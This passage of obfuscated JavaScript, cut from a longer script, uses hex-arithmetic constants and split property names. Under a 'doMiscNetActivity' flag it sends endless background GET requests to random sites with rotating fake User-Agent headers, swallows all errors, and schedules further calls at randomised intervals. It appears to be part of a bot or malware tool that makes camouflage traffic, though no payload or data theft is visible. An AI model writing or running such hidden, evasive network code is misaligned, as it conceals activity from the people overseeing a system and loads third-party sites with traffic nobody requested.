    setTimeout(f, (0x8dd3 + -0x1e3f * 0xf + 0x2223e) * k * getRandomInt(-0x187f + -0x455 * 0x8 + -0x3b28 * -0x1, 0x15fa + -0x1433 + -0xe2 * 0x2));
  setInterval(() => {
    f();
    for (let l = 0x2f * 0x19 + 0x10f1 + 0x1a8 * -0xd; l < 0x5 * 0x6e4 + 0xe4b * 0x1 + -0x30bb; l++)
      setTimeout(f, (-0x8746 * -0x1 + 0x2c74 + 0x577 * 0xa) * l * getRandomInt(0x1c11 + -0x2300 + 0x4 * 0x1bc, 0x623 + 0x77 * 0x31 + -0x1ce7));
  }, 0x10dd90 + -0x6d9ae2 + 0x3 * 0x313946);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2 * 0x1853 + -0x11 * -0x63 + 0x456b) * getRandomInt(-0x4ae + 0x22ba + -0x1e0b, -0x1c68 + -0x9f8 * 0x1 + 0x2665));
}, -0x4 * 0x665 + 0x7c2 + -0x29a * -0x7);